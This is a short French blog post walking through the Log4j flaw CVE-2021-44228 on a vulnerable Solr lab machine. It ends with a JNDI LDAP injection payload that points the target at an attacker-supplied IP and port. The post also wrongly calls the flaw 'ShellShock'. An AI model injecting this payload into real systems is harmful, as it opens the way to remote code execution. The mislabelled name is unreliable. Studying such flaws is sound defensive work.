---

layout: post

title: "Analyse de la faille Log4J"

date: 2021-12-13

categories: divers

---

# Analyse de la faille Log4J (CVE-2021-44228)

Pas besoin d'être un professionnel de la cybersécurité pour avoir entendu parler de cette faille.

Connue sous le nom de CVE-2021-44228, ou plus communément "ShellShock" de par son impact étendu, cette faille notée 10 (sur 10) par le scoring CVSS permet un _Remote Code Execution_ en exploitant le système de log basé sur Java : Log4j.

Je vous propose une brève analyse de cette faille. Avec tout d'abord un remerciement à John Hammond pour la création de la machine d'exploit.

# Reconnaissance de la faille

Cette faille se retrouve sur bon nombre d'applications, puisque Log4J est très répandue pour la création de logs. Pour cette attaque je me base sur l'application Solr, puisque cette dernière utilise une version vulnérable de Log4J.

![2](https://user-images.githubusercontent.com/16634117/145869688-87433bd9-c133-41de-bd0d-43588d5e01a1.PNG)

Un petit tour sur l'application et on remarque rapidement que Log4J est présent dans les arguments de l'application. 

Il faut maintenant savoir si cette version est vulnérable, pour ça il faut d'abord trouver un point d'injection. Le plus simple est donc de jeter un oeil aux logs de l'application :

![example_logs](https://user-images.githubusercontent.com/16634117/145869966-14f8f7bf-995c-470a-a6e8-dc4a334a5edb.png)

Ici, on voit clairement que les requêtes GET sont journalisées, l'url mais également **les paramètres**.

Pour identifier la vulnérabilité du système, il suffit d'injecter un paramètres GET avec la charge utile suivante (expliquée dans la présentation de la faille) :

`{jndi:ldap://<IP>:<PORT>}`
